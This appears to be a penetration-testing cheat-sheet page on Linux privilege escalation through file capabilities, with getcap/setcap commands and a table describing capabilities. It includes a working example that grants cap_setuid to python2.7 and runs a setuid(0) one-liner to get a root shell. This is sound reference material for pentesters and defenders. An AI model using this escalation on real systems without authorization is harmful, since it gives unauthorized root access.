# Escalating via Capabilities



#### List capabilities of binaries

```text
╭─swissky@lab ~  
╰─$ /usr/bin/getcap -r  /usr/bin
/usr/bin/fping                = cap_net_raw+ep
/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/rlogin               = cap_net_bind_service+ep
/usr/bin/ping                 = cap_net_raw+ep
/usr/bin/rsh                  = cap_net_bind_service+ep
/usr/bin/rcp                  = cap_net_bind_service+ep
```

#### 

#### Edit capabilities

```text
/usr/bin/setcap -r /bin/ping            # remove
/usr/bin/setcap cap_net_raw+p /bin/ping # add
```

#### 

#### Interesting capabilities

Having the capability =ep means the binary has all the capabilities.

```text
$ getcap openssl /usr/bin/openssl 
openssl=ep
```

Alternatively the following capabilities can be used in order to upgrade your current privileges.

```text
cap_dac_read_search # read anything
cap_setuid+ep # setuid
```

Example of privilege escalation with `cap_setuid+ep`

```text
$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7

$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
sh-5.0# id
uid=0(root) gid=1000(swissky)
```

| Capabilities name | Description |
| :--- | :--- |
| CAP\_AUDIT\_CONTROL | Allow to enable/disable kernel auditing |
| CAP\_AUDIT\_WRITE | Helps to write records to kernel auditing log |
| CAP\_BLOCK\_SUSPEND | This feature can block system suspends |
| CAP\_CHOWN | Allow user to make arbitrary change to files UIDs and GIDs |
| CAP\_DAC\_OVERRIDE | This helps to bypass file read, write and execute permission checks |
| CAP\_DAC\_READ\_SEARCH | This only bypass file and directory read/execute permission checks |
| CAP\_FOWNER | This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file |
| CAP\_KILL | Allow the sending of signals to processes belonging to others |
| CAP\_SETGID | Allow changing of the GID |
| CAP\_SETUID | Allow changing of the UID |
| CAP\_SETPCAP | Helps to transferring and removal of current set to any PID |
| CAP\_IPC\_LOCK | This helps to lock memory |
| CAP\_MAC\_ADMIN | Allow MAC configuration or state changes |
| CAP\_NET\_RAW | Use RAW and PACKET sockets |
| CAP\_NET\_BIND\_SERVICE | SERVICE Bind a socket to internet domain privileged ports |

